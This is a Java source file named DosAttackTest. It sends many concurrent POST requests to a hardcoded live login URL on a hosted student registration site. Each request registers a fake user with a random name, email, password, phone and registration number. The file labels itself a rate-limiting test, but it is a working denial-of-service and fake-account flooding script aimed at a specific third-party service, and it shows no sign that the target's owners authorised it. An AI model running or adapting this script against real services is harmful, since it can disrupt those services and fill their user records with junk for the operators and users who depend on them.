import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

public class DosAttackTest {
    
    private static final String API_URL = "https://ccpccuj-mem-reg-2026.hf.space/login";
    private static final String[] FIRST_NAMES = {
        "Aarav", "Vivaan", "Aditya", "Arjun", "Rohan", "Harsh", "Nikhil", 
        "Rajesh", "Priya", "Ananya", "Neha", "Pooja", "Sakshi", "Divya"
    };
    private static final String[] LAST_NAMES = {
        "Sharma", "Kumar", "Singh", "Patel", "Verma", "Gupta", "Mishra",
        "Yadav", "Nair", "Reddy", "Iyer", "Desai", "Chopra", "Trivedi"
    };
    
    private static final Random random = new Random();
    
    // Generate random name
    public static String generateRandomName() {
        return FIRST_NAMES[random.nextInt(FIRST_NAMES.length)] + " " + 
               LAST_NAMES[random.nextInt(LAST_NAMES.length)];
    }
    
    // Generate random email
    public static String generateRandomEmail() {
        String[] domains = {"gmail.com", "yahoo.com", "outlook.com", "student.edu", "test.com"};
        String[] prefixes = {"user", "test", "student", "alumni", "dev"};
        return prefixes[random.nextInt(prefixes.length)] + 
               random.nextInt(100000) + "@" + 
               domains[random.nextInt(domains.length)];
    }
    
    // Generate random 10-digit phone number
    public static String generateRandomPhone() {
        StringBuilder phone = new StringBuilder();
        for (int i = 0; i < 10; i++) {
            phone.append(random.nextInt(10));
        }
        return phone.toString();
    }
    
    // Generate random 10-digit registration number
    public static String generateRandomRegNo() {
        StringBuilder regNo = new StringBuilder();
        for (int i = 0; i < 10; i++) {
            regNo.append(random.nextInt(10));
        }
        return regNo.toString();
    }
    
    // Generate random password
    public static String generateRandomPassword() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%";
        StringBuilder password = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            password.append(chars.charAt(random.nextInt(chars.length())));
        }
        return password.toString();
    }
    
    // Create registration data
    public static JSONObject createRegistrationData() {
        JSONObject data = new JSONObject();
        data.put("name", generateRandomName());
        data.put("email", generateRandomEmail());
        data.put("password", generateRandomPassword());
        data.put("phone", generateRandomPhone());
        data.put("PreferedLanguage", "java");
        data.put("Skills", "Testing DOS Attack");
        data.put("reg_no", generateRandomRegNo());
        data.put("Batch", "2023");
        return data;
    }
    
    // Send POST request
    public static void sendRequest(int requestNumber) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(API_URL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            
            // Generate random data
            JSONObject data = createRegistrationData();
            
            // Send request
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = data.toString().getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            // Get response
            int responseCode = connection.getResponseCode();
            String responseMessage = connection.getResponseMessage();
            
            // Read response body
            String responseBody = "";
            try (BufferedReader br = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    response.append(line.trim());
                }
                responseBody = response.toString();
            } catch (Exception e) {
                // Handle error stream if needed
            }
            
            System.out.println("[Request #" + requestNumber + "] Status: " + responseCode + 
                             " | Message: " + responseMessage + 
                             " | Email: " + data.getString("email") + 
                             " | RegNo: " + data.getString("reg_no"));
            
        } catch (Exception e) {
            System.err.println("[Request #" + requestNumber + "] Error: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
    
    public static void main(String[] args) throws InterruptedException {
        System.out.println("========================================");
        System.out.println("DOS Attack Test - Rate Limiting Tester");
        System.out.println("========================================");
        System.out.println("Target URL: " + API_URL);
        System.out.println();
        
        // Configuration
        int totalRequests = 100;  // Number of requests to send
        int threadsCount = 10;    // Number of concurrent threads
        int delayMs = 100;        // Delay between batches (ms)
        
        if (args.length > 0) {
            totalRequests = Integer.parseInt(args[0]);
        }
        if (args.length > 1) {
            threadsCount = Integer.parseInt(args[1]);
        }
        if (args.length > 2) {
            delayMs = Integer.parseInt(args[2]);
        }
        
        System.out.println("Configuration:");
        System.out.println("- Total Requests: " + totalRequests);
        System.out.println("- Concurrent Threads: " + threadsCount);
        System.out.println("- Delay between batches: " + delayMs + "ms");
        System.out.println();
        System.out.println("Starting DOS Attack Test...");
        System.out.println("========================================\n");
        
        ExecutorService executorService = Executors.newFixedThreadPool(threadsCount);
        long startTime = System.currentTimeMillis();
        
        // Submit requests
        for (int i = 1; i <= totalRequests; i++) {
            final int requestNumber = i;
            executorService.submit(() -> sendRequest(requestNumber));
            
            // Add delay between batches
            if (i % threadsCount == 0) {
                try {
                    Thread.sleep(delayMs);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }
        
        // Shutdown and wait
        executorService.shutdown();
        executorService.awaitTermination(5, TimeUnit.MINUTES);
        
        long endTime = System.currentTimeMillis();
        long totalTime = endTime - startTime;
        
        System.out.println("\n========================================");
        System.out.println("DOS Attack Test Completed!");
        System.out.println("Total Requests: " + totalRequests);
        System.out.println("Total Time: " + totalTime + "ms");
        System.out.println("Average Time per Request: " + (totalTime / totalRequests) + "ms");
        System.out.println("Requests per Second: " + 
                          String.format("%.2f", (totalRequests * 1000.0) / totalTime));
        System.out.println("========================================");
    }
}
